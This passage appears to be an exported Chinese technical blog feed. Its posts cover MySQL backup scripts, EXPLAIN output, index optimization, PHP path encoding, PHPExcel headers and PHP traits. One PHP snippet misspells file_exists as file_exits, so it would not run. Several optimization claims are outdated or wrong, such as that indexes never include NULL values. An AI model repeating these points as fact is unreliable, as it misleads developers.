<p><a href="http://blog.ihuxu.com/explaination-of-the-mysql-variables-usage-and-the-use-case/#mysql-user-defined-variables" target="_blank" rel="noopener">深入MySQL用户自定义变量</a> 胡小旭<br><a href="https://www.jianshu.com/p/bb1b72a1623e" target="_blank" rel="noopener">在MySQL中实现Rank高级排名函数</a> 风澈vio</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>mysql数据定时备份</title>
    <url>/articles/mysql%E6%95%B0%E6%8D%AE%E5%AE%9A%E6%97%B6%E5%A4%87%E4%BB%BD/</url>
    <content><![CDATA[<p>核心命令：<strong>path/mysqldump –opt -u数据库账号 -p数据库密码 &gt; 备份文件名</strong></p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>备份脚本 ( mysql_back.sh)：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: /root/mysql_dump/mysql_back.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tabase info</span></span><br><span class="line"></span><br><span class="line">DB_NAME=<span class="string">"数据库名字"</span></span><br><span class="line"></span><br><span class="line">DB_USER=<span class="string">"数据库用户"</span></span><br><span class="line"></span><br><span class="line">DB_PASS=<span class="string">"数据库密码"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Others vars</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># whereis mysqldump</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># IS ` but not '</span></span><br><span class="line"></span><br><span class="line">BIN_DIR=<span class="string">"/usr/local/mysql/bin"</span>  <span class="comment"># mysql 安装bin目录</span></span><br><span class="line"></span><br><span class="line">BCK_DIR=<span class="string">"/root/mysql_dump/data"</span> <span class="comment"># 备份目录</span></span><br><span class="line"></span><br><span class="line">DATE=`date +%Y%m%d_%H%M%S`      <span class="comment"># 生成一个时间戳</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># TODO</span></span><br><span class="line"></span><br><span class="line">mkdir -p <span class="variable">$BCK_DIR</span>  <span class="comment"># 如果备份目录不存在则创建一个备份目录</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份命令</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$BIN_DIR</span>/mysqldump --opt -u<span class="variable">$DB_USER</span> -p<span class="variable">$DB_PASS</span> <span class="variable">$DB_NAME</span>  &gt; <span class="variable">$BCK_DIR</span>/<span class="variable">$DB_NAME</span>.dump_<span class="variable">$DATE</span>.sql</span><br></pre></td></tr></table></figure>

<p>定时执行脚本：</p>
<p>例如; 每天晚上0点执行</p>
<p>在终端下执行 crontab -e（需要root权限），进入vi编辑窗口，添加一行：</p>
<p><code>0 0 * * * /root/mysql_dump/mysql_back.sh</code></p>
<h3 id="Window"><a href="#Window" class="headerlink" title="Window"></a>Window</h3><p>备份脚本(mysql_back.bat) ：</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line">:: !/bin/bat</span><br><span class="line"></span><br><span class="line">:: File: /root/mysql_dump/mysql_back.bat</span><br><span class="line"></span><br><span class="line">:: tabase info</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> DB_NAME=com_cms</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> DB_USER=root</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> DB_PASS=root</span><br><span class="line"></span><br><span class="line">:: Others vars</span><br><span class="line"></span><br><span class="line">:: mysql 安装目录下的bin</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> BIN_DIR=d:/wamp/bin/mysql/mysql5.<span class="number">7</span>.<span class="number">14</span>/bin</span><br><span class="line"></span><br><span class="line">:: 备份目录</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> BCK_DIR=d:/backup</span><br><span class="line"></span><br><span class="line">:: 生成一个时间戳</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">DATE</span>=<span class="variable">%date:~0,4%</span><span class="variable">%date:~5,2%</span><span class="variable">%date:~8,2%</span><span class="variable">%time:~0,2%</span><span class="variable">%time:~3,2%</span><span class="variable">%time:~6,2%</span></span><br><span class="line"></span><br><span class="line">:: TODO 如果备份目录不存在则创建一个备份目录</span><br><span class="line"></span><br><span class="line"><span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXIST</span> <span class="variable">%BCK_DIR%</span> <span class="built_in">MD</span> <span class="variable">%BCK_DIR%</span></span><br><span class="line"></span><br><span class="line">:: 备份命令</span><br><span class="line"></span><br><span class="line"><span class="variable">%BIN_DIR%</span>/mysqldump --opt -u<span class="variable">%DB_USER%</span> -p<span class="variable">%DB_PASS%</span> <span class="variable">%DB_NAME%</span>  &gt; <span class="variable">%BCK_DIR%</span>/<span class="variable">%DB_NAME%</span>.dump_<span class="variable">%DATE%</span>.sql</span><br></pre></td></tr></table></figure>

<p>定时执行脚本：</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">schtasks /create /tn <span class="string">"任务名字"</span> /tr d:/backup/mysql_back.bat /sc daily /st <span class="number">00</span>:<span class="number">00</span> /ed <span class="number">31</span>/<span class="number">12</span>/<span class="number">2017</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> ws = <span class="built_in">CreateObject</span>(<span class="string">"Wscript.Shell"</span>)</span><br><span class="line"></span><br><span class="line">ws.run <span class="string">"d:/backup/mysql_back"</span>,vbhide</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>mysql explain执行计划详解</title>
    <url>/articles/mysql-explain%E6%89%A7%E8%A1%8C%E8%AE%A1%E5%88%92%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<p><img src="/articles/mysql-explain执行计划详解/psb.png" alt></p>
<h2 id="id"><a href="#id" class="headerlink" title="id"></a>id</h2><p>数字越大越先执行，如果说数字一样大，那么就从上往下依次执行，id列为null的就表是这是一个结果集，不需要使用它来进行查询。</p>
<h2 id="select-type"><a href="#select-type" class="headerlink" title="select_type"></a>select_type</h2><p>常见的有：</p>
<ul>
<li><p>simple：表示不需要union操作或者不包含子查询的简单select查询。有连接查询时，外层的查询为simple，且只有一个</p>
</li>
<li><p>primary：一个需要union操作或者含有子查询的select，位于最外层的单位查询的select_type即为primary。且只有一个</p>
</li>
<li><p>union：union连接的两个select查询，第一个查询是dervied派生表，除了第一个表外，第二个以后的表select_type都是union</p>
</li>
<li><p>dependent union：与union一样，出现在union 或union all语句中，但是这个查询要受到外部查询的影响</p>
</li>
<li><p>union result：包含union的结果集，在union和union all语句中,因为它不需要参与查询，所以id字段为null</p>
</li>
<li><p>subquery：除了from字句中包含的子查询外，其他地方出现的子查询都可能是subquery</p>
</li>
<li><p>dependent subquery：与dependent union类似，表示这个subquery的查询要受到外部表查询的影响</p>
</li>
<li><p>derived：from字句中出现的子查询，也叫做派生表，其他数据库中可能叫做内联视图或嵌套select</p>
</li>
</ul>
<h2 id="table"><a href="#table" class="headerlink" title="table"></a>table</h2><p>显示的查询表名，如果查询使用了别名，那么这里显示的是别名，如果不涉及对数据表的操作，那么这显示为null，如果显示为尖括号括起来的<derived n>就表示这个是临时表，后边的N就是执行计划中的id，表示结果来自于这个查询产生。如果是尖括号括起来的&lt;union M,N&gt;，与<derived n>类似，也是一个临时表，表示这个结果来自于union查询的id为M,N的结果集。</derived></derived></p>
<h2 id="type"><a href="#type" class="headerlink" title="type"></a>type</h2><p>依次从好到差：system，const，eq_ref，ref，fulltext，ref_or_null，unique_subquery，index_subquery，range，index_merge，index，ALL，除了all之外，其他的type都可以使用到索引，除了index_merge之外，其他的type只可以用到一个索引</p>
<ul>
<li><p>system：表中只有一行数据或者是空表，且只能用于myisam和memory表。如果是Innodb引擎表，type列在这个情况通常都是all或者index</p>
</li>
<li><p>const：使用唯一索引或者主键，返回记录一定是1行记录的等值where条件时，通常type是const。其他数据库也叫做唯一索引扫描</p>
</li>
<li><p>eq_ref：出现在要连接过个表的查询计划中，驱动表只返回一行数据，且这行数据是第二个表的主键或者唯一索引，且必须为not null，唯一索引和主键是多列时，只有所有的列都用作比较时才会出现eq_ref</p>
</li>
<li><p>ref：不像eq_ref那样要求连接顺序，也没有主键和唯一索引的要求，只要使用相等条件检索时就可能出现，常见与辅助索引的等值查找。或者多列主键、唯一索引中，使用第一个列之外的列作为等值查找也会出现，总之，返回数据不唯一的等值查找就可能出现。</p>
</li>
<li><p>fulltext：全文索引检索，要注意，全文索引的优先级很高，若全文索引和普通索引同时存在时，mysql不管代价，优先选择使用全文索引</p>
</li>
<li><p>ref_or_null：与ref方法类似，只是增加了null值的比较。实际用的不多。</p>
</li>
<li><p>unique_subquery：用于where中的in形式子查询，子查询返回不重复值唯一值</p>
</li>
<li><p>index_subquery：用于in形式子查询使用到了辅助索引或者in常数列表，子查询可能返回重复值，可以使用索引将子查询去重。</p>
</li>
<li><p>range：索引范围扫描，常见于使用&gt;,&lt;,is null,between ,in ,like等运算符的查询中。</p>
</li>
<li><p>index_merge：表示查询使用了两个以上的索引，最后取交集或者并集，常见and ，or的条件使用了不同的索引，官方排序这个在ref_or_null之后，但是实际上由于要读取所个索引，性能可能大部分时间都不如range</p>
</li>
<li><p>index：索引全表扫描，把索引从头到尾扫一遍，常见于使用索引列就可以处理不需要读取数据文件的查询、可以使用索引排序或者分组的查询。</p>
</li>
<li><p>all：这个就是全表扫描数据文件，然后再在server层进行过滤返回符合要求的记录。</p>
</li>
</ul>
<h2 id="possible-keys"><a href="#possible-keys" class="headerlink" title="possible_keys"></a>possible_keys</h2><p>查询可能使用到的索引都会在这里列出来</p>
<h2 id="key"><a href="#key" class="headerlink" title="key"></a>key</h2><p>查询真正使用到的索引，select_type为index_merge时，这里可能出现两个以上的索引，其他的select_type这里只会出现一个。</p>
<h2 id="key-len"><a href="#key-len" class="headerlink" title="key_len"></a>key_len</h2><p>用于处理查询的索引长度，如果是单列索引，那就整个索引长度算进去，如果是多列索引，那么查询不一定都能使用到所有的列，具体使用到了多少个列的索引，这里就会计算进去，没有使用到的列，这里不会计算进去。留意下这个列的值，算一下你的多列索引总长度就知道有没有使用到所有的列了。要注意，mysql的ICP特性使用到的索引不会计入其中。另外，key_len只计算where条件用到的索引长度，而排序和分组就算用到了索引，也不会计算到key_len中。</p>
<h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><p>如果是使用的常数等值查询，这里会显示const，如果是连接查询，被驱动表的执行计划这里会显示驱动表的关联字段，如果是条件使用了表达式或者函数，或者条件列发生了内部隐式转换，这里可能显示为func</p>
<h2 id="rows"><a href="#rows" class="headerlink" title="rows"></a>rows</h2><p>这里是执行计划中估算的扫描行数，不是精确值</p>
<h2 id="extra"><a href="#extra" class="headerlink" title="extra"></a>extra</h2><p>这个列可以显示的信息非常多，有几十种，常用的有</p>
<ul>
<li><p>distinct：在select部分使用了distinc关键字</p>
</li>
<li><p>no tables used：不带from字句的查询或者From dual查询</p>
</li>
<li><p>使用not in()形式子查询或not exists运算符的连接查询，这种叫做反连接。即，一般连接查询是先查询内表，再查询外表，反连接就是先查询外表，再查询内表。</p>
</li>
<li><p>using filesort：排序时无法使用到索引时，就会出现这个。常见于order by和group by语句中</p>
</li>
<li><p>using index：查询时不需要回表查询，直接通过索引就可以获取查询的数据。</p>
</li>
<li><p>using join buffer（block nested loop），using join buffer（batched key accss）：5.6.x之后的版本优化关联查询的BNL，BKA特性。主要是减少内表的循环数量以及比较顺序地扫描查询。</p>
</li>
<li><p>using sort_union，using_union，using intersect，using sort_intersection：</p>
</li>
<li><p>using intersect：表示使用and的各个索引的条件时，该信息表示是从处理结果获取交集</p>
</li>
<li><p>using union：表示使用or连接各个使用索引的条件时，该信息表示从处理结果获取并集</p>
</li>
<li><p>using sort_union和using sort_intersection：与前面两个对应的类似，只是他们是出现在用and和or查询信息量大时，先查询主键，然后进行排序合并后，才能读取记录并返回。</p>
</li>
<li><p>using temporary：表示使用了临时表存储中间结果。临时表可以是内存临时表和磁盘临时表，执行计划中看不出来，需要查看status变量，used_tmp_table，used_tmp_disk_table才能看出来。</p>
</li>
<li><p>using where：表示存储引擎返回的记录并不是所有的都满足查询条件，需要在server层进行过滤。查询条件中分为限制条件和检查条件，5.6之前，存储引擎只能根据限制条件扫描数据并返回，然后server层根据检查条件进行过滤再返回真正符合查询的数据。5.6.x之后支持ICP特性，可以把检查条件也下推到存储引擎层，不符合检查条件和限制条件的数据，直接不读取，这样就大大减少了存储引擎扫描的记录数量。extra列显示using index condition</p>
</li>
<li><p>firstmatch(tb_name)：5.6.x开始引入的优化子查询的新特性之一，常见于where字句含有in()类型的子查询。如果内表的数据量比较大，就可能出现这个</p>
</li>
<li><p>loosescan(m..n)：5.6.x之后引入的优化子查询的新特性之一，在in()类型的子查询中，子查询返回的可能有重复记录时，就可能出现这个</p>
</li>
</ul>
<p>除了这些之外，还有很多查询数据字典库，执行计划过程中就发现不可能存在结果的一些提示信息</p>
<h2 id="filtered"><a href="#filtered" class="headerlink" title="filtered"></a>filtered</h2><p>使用explain extended时会出现这个列，5.7之后的版本默认就有这个字段，不需要使用explain extended了。这个字段表示存储引擎返回的数据在server层过滤后，剩下多少满足查询的记录数量的比例，注意是百分比，不是具体记录数。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>mysql优化</title>
    <url>/articles/mysql%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h4 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h4><p>对于查询占主要的应用来说，索引显得尤为重要。很多时候性能问题很简单的就是因为我们忘了添加索引而造成的，或者说没有添加更为有效的索引导致。如果不加索引的话，那么查找任何哪怕只是一条特定的数据都会进行一次全表扫描，如果一张表的数据量很大而符合条件的结果又很少，那么不加索引会引起致命的性能下降。但是也不是什么情况都非得建索引不可，比如性别可能就只有两个值，建索引不仅没什么优势，还会影响到更新速度，这被称为过度索引。</p>
<h4 id="复合索引"><a href="#复合索引" class="headerlink" title="复合索引"></a>复合索引</h4><p>比如有一条语句是这样的：<code>select * from users where area=&#39;beijing&#39; and age=22</code></p>
<p>如果我们是在area和age上分别创建单个索引的话，由于mysql查询每次只能使用一个索引，所以虽然这样已经相对不做索引时全表扫描提高了很多效率，但是如果在area、age两列上创建复合索引的话将带来更高的效率。如果我们创建了(area, age, salary)的复合索引，那么其实相当于创建了(area,age,salary)、(area,age)、(area)三个索引，这被称为最佳左前缀特性。因此我们在创建复合索引时应该将最常用  作限制条件的列放在最左边，依次递减。</p>
<h4 id="索引不会包含有NULL值的列"><a href="#索引不会包含有NULL值的列" class="headerlink" title="索引不会包含有NULL值的列"></a>索引不会包含有NULL值的列</h4><p>只要列中包含有NULL值都将不会被包含在索引中，复合索引中只要有一列含有NULL值，那么这一列对于此复合索引就是无效的。所以我们在数据库设计时不要让字段的默认值为NULL。</p>
<h4 id="使用短索引"><a href="#使用短索引" class="headerlink" title="使用短索引"></a>使用短索引</h4><p>对串列进行索引，如果可能应该指定一个前缀长度。例如，如果有一个CHAR(255)的 列，如果在前10 个或20 个字符内，多数值是惟一的，那么就不要对整个列进行索引。短索引不仅可以提高查询速度而且可以节省磁盘空间和I/O操作。</p>
<h4 id="排序的索引问题"><a href="#排序的索引问题" class="headerlink" title="排序的索引问题"></a>排序的索引问题</h4><p>mysql查询只使用一个索引，因此如果where子句中已经使用了索引的话，那么order by中的列是不会使用索引的。因此数据库默认排序可以符合要求的情况下不要使用排序操作；尽量不要包含多个列的排序，如果需要最好给这些列创建复合索引。</p>
<h4 id="like语句操作"><a href="#like语句操作" class="headerlink" title="like语句操作"></a>like语句操作</h4><p>一般情况下不鼓励使用like操作，如果非使用不可，如何使用也是一个问题。like “%aaa%” 不会使用索引而like “aaa%”可以使用索引。</p>
<h4 id="不要在列上进行运算"><a href="#不要在列上进行运算" class="headerlink" title="不要在列上进行运算"></a>不要在列上进行运算</h4><p><code>select * from users where YEAR(adddate)&lt;2007</code></p>
<p>将在每个行上进行运算，这将导致索引失效而进行全表扫描，因此我们可以改成</p>
<p><code>select * from users where adddate &lt; &#39;2007-01-01&#39;</code></p>
<p>8、不使用NOT IN和&lt;&gt;操作</p>
<p>NOT IN和&lt;&gt;操作都不会使用索引将进行全表扫描。NOT IN可以NOT EXISTS代替，id&lt;&gt;3则可使用id&gt;3 or id&lt;3来代替。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>php 读取中文目录报错</title>
    <url>/articles/php%20%E8%AF%BB%E5%8F%96%E4%B8%AD%E6%96%87%E7%9B%AE%E5%BD%95%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<p>问题的发现：</p>
<p>（1）在php文件所在目录，手动创建了文件名为“测试.txt”和“test.txt”的文件；</p>
<p>（2）执行下列代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(file_exits(<span class="string">"测试.txt"</span>)); <span class="comment">// false</span></span><br><span class="line">var_dump(file_exits(<span class="string">"test.txt"</span>)); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>分析原因：</p>
<blockquote>
<p>编码的不一样，导致文件系统无法识别UTF8编码下的中文路径；</p>
</blockquote>
<p>解决方法:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(file_exits(iconv(<span class="string">'UTF-8'</span>,<span class="string">'GB2312'</span>,<span class="string">"测试.txt"</span>)));<span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>*在使用非ASCII码表字符时，必须考虑的以下几个问题是：</p>
<p>（1）操作系统的编码；</p>
<p>（2）存储环境的编码；</p>
<p>（3）代码文件的编码；</p>
<p>（4）目标运行环境的编码</p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>phpexcel导出excel无法打开，提示文件格式或文件名无效，文件损毁，解决办法</title>
    <url>/articles/phpexcel%E5%AF%BC%E5%87%BAexcel%E6%97%A0%E6%B3%95%E6%89%93%E5%BC%80-%E6%8F%90%E7%A4%BA%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%88%96%E6%96%87%E4%BB%B6%E5%90%8D%E6%97%A0%E6%95%88-%E6%96%87%E4%BB%B6%E6%8D%9F%E6%AF%81-%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>xls还是xlsx？首先确定导出的excel文件扩展名,然后添加header，不同的文件类型，不同的header。我就是这里出了问题，xlsx用了xls的header，导致导出的excel无法打开。</p>
</blockquote>
<p><strong>xlsx如下：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$excelName = <span class="string">'绩效得分统计'</span>.time();</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Disposition: attachment;filename="'</span>.$excelName.<span class="string">'.xlsx"'</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Cache-Control: max-age=0'</span>);</span><br><span class="line"></span><br><span class="line">$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, <span class="string">'Excel2007'</span>);</span><br><span class="line"></span><br><span class="line">$objWriter-&gt;save(<span class="string">'php://output'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

<p><strong>xls如下：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">header(<span class="string">'Content-Type: application/vnd.ms-excel'</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Disposition: attachment;filename="links_out'</span>.$timestamp.<span class="string">'.xls"'</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Cache-Control: max-age=0'</span>);</span><br><span class="line"></span><br><span class="line">$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, <span class="string">'Excel5'</span>);</span><br><span class="line"></span><br><span class="line">$objWriter-&gt;save(<span class="string">'php://output'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

<p>末尾添加exit。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$objWriter-&gt;save(<span class="string">'php://output'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>php如何实现“多继承”</title>
    <url>/articles/php%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BB%A7%E6%89%BF/</url>
    <content><![CDATA[<h2 id="Trait"><a href="#Trait" class="headerlink" title="Trait"></a>Trait</h2><p>自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。</p>
<p>Trait 是为类似 PHP 的单继承语言而准备的一种代码复用机制。Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用 method。Trait 和 Class 组合的语义定义了一种减少复杂性的方式，避免传统多继承和 Mixin 类相关典型问题。</p>
<p>Trait 和 Class 相似，但仅仅旨在用细粒度和一致的方式来组合功能。 无法通过 trait 自身来实例化。它为传统继承增加了水平特性的组合；也就是说，应用的几个 Class 之间不需要继承。</p>
<h3 id="Example-1-Trait-示例"><a href="#Example-1-Trait-示例" class="headerlink" title="Example #1 Trait 示例"></a>Example #1 Trait 示例</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> ezcReflectionReturnInfo &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getReturnType</span><span class="params">()</span> </span>&#123; <span class="comment">/*1*/</span> &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getReturnDescription</span><span class="params">()</span> </span>&#123; <span class="comment">/*2*/</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ezcReflectionMethod</span> <span class="keyword">extends</span> <span class="title">ReflectionMethod</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ezcReflectionReturnInfo</span>;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ezcReflectionFunction</span> <span class="keyword">extends</span> <span class="title">ReflectionFunction</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ezcReflectionReturnInfo</span>;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h2><p>从基类继承的成员会被 trait 插入的成员所覆盖。优先顺序是来自当前类的成员覆盖了 trait 的方法，而 trait 则覆盖了被继承的方法。</p>
<h3 id="Example-2-优先顺序示例"><a href="#Example-2-优先顺序示例" class="headerlink" title="Example #2 优先顺序示例"></a>Example #2 优先顺序示例</h3><p>从基类继承的成员被插入的 SayWorld Trait 中的 MyHelloWorld 方法所覆盖。其行为 MyHelloWorld 类中定义的方法一致。优先顺序是当前类中的方法会覆盖 trait 方法，而 trait 方法又覆盖了基类中的方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> SayWorld &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">parent</span>::sayHello();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'World!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> <span class="keyword">extends</span> <span class="title">Base</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">SayWorld</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> MyHelloWorld();</span><br><span class="line">$o-&gt;sayHello();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上例程会输出：</p>
<pre><code>Hello World!</code></pre><h3 id="Example-3-另一个优先级顺序的例子"><a href="#Example-3-另一个优先级顺序的例子" class="headerlink" title="Example #3 另一个优先级顺序的例子"></a>Example #3 另一个优先级顺序的例子</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> HelloWorld &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello World!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TheWorldIsNotEnough</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">HelloWorld</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello Universe!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> TheWorldIsNotEnough();</span><br><span class="line">$o-&gt;sayHello();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上例程会输出：</p>
<pre><code>Hello Universe!</code></pre><h2 id="多个-trait"><a href="#多个-trait" class="headerlink" title="多个 trait"></a>多个 trait</h2><p>通过逗号分隔，在 use 声明列出多个 trait，可以都插入到一个类中。</p>
<h3 id="Example-4-多个-trait-的用法"><a href="#Example-4-多个-trait-的用法" class="headerlink" title="Example #4 多个 trait 的用法"></a>Example #4 多个 trait 的用法</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">trait</span> Hello &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Hello '</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">trait</span> World &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayWorld</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'World'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyHelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">Hello</span>, <span class="title">World</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sayExclamationMark</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'!'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> MyHelloWorld();</span><br><span class="line">$o-&gt;sayHello();</span><br><span class="line">$o-&gt;sayWorld();</span><br><span class="line">$o-&gt;sayExclamationMark();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>以上例程会输出：</p>
<pre><code>Hello World!</code></pre><h2 id="冲突的解决"><a href="#冲突的解决" class="headerlink" title="冲突的解决"></a>冲突的解决</h2><p>如果两个 trait 都插入了一个同名的方法，如果没有明确解决冲突将会产生一个致命错误。</p>
<p>为了解决多个 trait 在同一个类中的命名冲突，需要使用 insteadof 操作符来明确指定使用冲突方法中的哪一个。</p>
<p>以上方式仅允许排除掉其它方法，as 操作符可以 为某个方法引入别名。 注意，as 操作符不会对方法进行重命名，也不会影响其方法。</p>
<h3 id="Example-5-冲突的解决"><a href="#Example-5-冲突的解决" class="headerlink" title="Example #5 冲突的解决"></a>Example #5 冲突的解决</h3><p>在本例中 Talker 使用了 trait A 和 B。由于 A 和 B 有冲突的方法，其定义了使用 trait B 中的 smallTalk 以及 trait A 中的 bigTalk。</p>
<p>Aliased_Talker 使用了 as 操作符来定义了 talk 来作为 B 的 bigTalk 的别名。</p>
